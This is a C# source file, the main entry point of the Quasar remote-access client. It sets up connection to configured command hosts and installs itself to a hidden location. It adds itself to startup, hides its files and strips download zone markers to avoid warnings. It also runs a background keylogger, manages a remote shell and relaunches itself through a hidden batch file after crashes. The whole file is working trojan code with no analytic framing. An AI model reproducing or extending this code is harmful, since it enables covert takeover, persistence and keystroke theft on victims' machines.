using System;
using System.Diagnostics;
using System.IO;
using System.Threading;
using System.Windows.Forms;
using xClient.Config;
using xClient.Core.Commands;
using xClient.Core.Cryptography;
using xClient.Core.Data;
using xClient.Core.Helper;
using xClient.Core.Installation;
using xClient.Core.Networking;
using xClient.Core.Utilities;

namespace xClient
{
    internal static class Program
    {
        public static QuasarClient ConnectClient;
        private static ApplicationContext _msgLoop;

        [STAThread]
        private static void Main(string[] args)
        {
            Application.EnableVisualStyles();
            Application.SetCompatibleTextRenderingDefault(false);
            AppDomain.CurrentDomain.UnhandledException += HandleUnhandledException;

            if (Settings.Initialize())
            {
                if (Initialize())
                {
                    if (!QuasarClient.Exiting)
                        ConnectClient.Connect();
                }
            }

            Cleanup();
            Exit();
        }

        private static void Exit()
        {
            // Don't wait for other threads
            if (_msgLoop != null || Application.MessageLoop)
                Application.Exit();
            else
                Environment.Exit(0);
        }

        private static void HandleUnhandledException(object sender, UnhandledExceptionEventArgs e)
        {
            if (e.IsTerminating)
            {
                string batchFile = FileHelper.CreateRestartBatch();
                if (string.IsNullOrEmpty(batchFile)) return;

                ProcessStartInfo startInfo = new ProcessStartInfo
                {
                    WindowStyle = ProcessWindowStyle.Hidden,
                    UseShellExecute = true,
                    FileName = batchFile
                };
                Process.Start(startInfo);
                Exit();
            }
        }

        private static void Cleanup()
        {
            CommandHandler.CloseShell();
            if (CommandHandler.StreamCodec != null)
                CommandHandler.StreamCodec.Dispose();
            if (Keylogger.Instance != null)
                Keylogger.Instance.Dispose();
            if (_msgLoop != null)
            {
                _msgLoop.ExitThread();
                _msgLoop.Dispose();
                _msgLoop = null;
            }
            MutexHelper.CloseMutex();
        }

        private static bool Initialize()
        {
            var hosts = new HostsManager(HostHelper.GetHostsList(Settings.HOSTS));

            // process with same mutex is already running
            if (!MutexHelper.CreateMutex(Settings.MUTEX) || hosts.IsEmpty || string.IsNullOrEmpty(Settings.VERSION)) // no hosts to connect
                return false;

            AES.SetDefaultKey(Settings.KEY, Settings.AUTHKEY);
            ClientData.InstallPath = Path.Combine(Settings.DIRECTORY, ((!string.IsNullOrEmpty(Settings.SUBDIRECTORY)) ? Settings.SUBDIRECTORY + @"\" : "") + Settings.INSTALLNAME);
            GeoLocationHelper.Initialize();
            
            FileHelper.DeleteZoneIdentifier(ClientData.CurrentPath);

            if (!Settings.INSTALL || ClientData.CurrentPath == ClientData.InstallPath)
            {
                WindowsAccountHelper.StartUserIdleCheckThread();

                if (Settings.STARTUP)
                {
                    if (!Startup.AddToStartup())
                        ClientData.AddToStartupFailed = true;
                }

                if (Settings.INSTALL && Settings.HIDEFILE)
                {
                    try
                    {
                        File.SetAttributes(ClientData.CurrentPath, FileAttributes.Hidden);
                    }
                    catch (Exception)
                    {
                    }
                }
                if (Settings.INSTALL && Settings.HIDEINSTALLSUBDIRECTORY && !string.IsNullOrEmpty(Settings.SUBDIRECTORY))
                {
                    try
                    {
                        DirectoryInfo di = new DirectoryInfo(Path.GetDirectoryName(ClientData.InstallPath));
                        di.Attributes |= FileAttributes.Hidden;

                    }
                    catch (Exception)
                    {
                    }
                }
                if (Settings.ENABLELOGGER)
                {
                    new Thread(() =>
                    {
                        _msgLoop = new ApplicationContext();
                        Keylogger logger = new Keylogger(15000);
                        Application.Run(_msgLoop);
                    }) {IsBackground = true}.Start();
                }

                ConnectClient = new QuasarClient(hosts);
                return true;
            }
            else
            {
                MutexHelper.CloseMutex();
                ClientInstaller.Install(ConnectClient);
                return false;
            }
        }
    }
}